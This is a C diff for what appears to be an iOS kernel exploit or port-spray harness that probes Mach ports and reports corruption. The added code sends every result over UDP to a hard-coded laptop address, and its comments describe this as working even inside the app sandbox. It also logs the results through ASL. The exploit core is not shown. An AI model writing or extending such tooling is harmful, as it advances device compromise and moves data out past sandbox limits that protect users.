@@ -32,6 +32,14 @@
 #include <unistd.h>
 #include <fcntl.h>
 #include <errno.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <asl.h>
+
+/* UDP back-report to laptop on same WiFi */
+#define NEXUS_UDP_HOST  "192.168.68.122"
+#define NEXUS_UDP_PORT  9999
 
 #define NUM_PORTS     500    /* reduced: v2+v3 already hold 10K ports in system */
 #define SCAN_INTERVAL 0.05   /* 50ms */
@@ -48,11 +56,33 @@ static int               g_count   = 0;
 static int               g_found   = 0;
 static int               g_tick    = 0;
 
+/* ASL log — captured by DVT outputReceived:fromProcess: */
+static void asl_report(const char *buf) {
+    asl_log(NULL, NULL, ASL_LEVEL_NOTICE, "%s", buf);
+}
+
+/* UDP back-report to nexus laptop — works on same WiFi even in sandbox */
+static void udp_report(const char *buf, int len) {
+    int sock = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sock < 0) return;
+    struct sockaddr_in addr;
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(NEXUS_UDP_PORT);
+    inet_aton(NEXUS_UDP_HOST, &addr.sin_addr);
+    sendto(sock, buf, (size_t)len, 0, (struct sockaddr *)&addr, sizeof(addr));
+    close(sock);
+}
+
 static void dcim_write(const char *name, const char *buf, int len) {
+    /* Try DCIM (may fail in sandbox, that's OK) */
     char path[128];
     snprintf(path, sizeof(path), "/var/mobile/Media/DCIM/%s", name);
     int fd = open(path, O_WRONLY|O_CREAT|O_TRUNC, 0644);
     if (fd >= 0) { write(fd, buf, len); close(fd); }
+    /* Always UDP-report and ASL-log */
+    udp_report(buf, len);
+    asl_report(buf);
 }
 
 static void dcim_append(const char *name, const char *buf, int len) {
@@ -60,6 +90,8 @@ static void dcim_append(const char *name, const char *buf, int len) {
     snprintf(path, sizeof(path), "/var/mobile/Media/DCIM/%s", name);
     int fd = open(path, O_WRONLY|O_CREAT|O_APPEND, 0644);
     if (fd >= 0) { write(fd, buf, len); close(fd); }
+    udp_report(buf, len);
+    asl_report(buf);
 }
 
 static void report_corruption(int idx, kern_return_t kr,
